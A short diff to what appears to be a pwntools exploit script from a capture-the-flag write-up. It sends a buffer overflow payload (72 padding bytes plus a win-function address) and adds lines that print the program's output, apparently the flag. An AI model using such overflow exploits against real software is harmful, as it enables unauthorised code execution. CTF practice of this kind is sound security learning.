@@ -41,4 +41,6 @@ payload = b"A" * 72 # offset found using gdb
 payload += p64(binary.sym.unreeeeeeeeeeeeeeeeeeeeeeal)
 
 p.sendlineafter(b"today: ", payload)
+output = p.recvall().decode("latin-1")
+log.success(output[output.find("unreal") :])
 ```
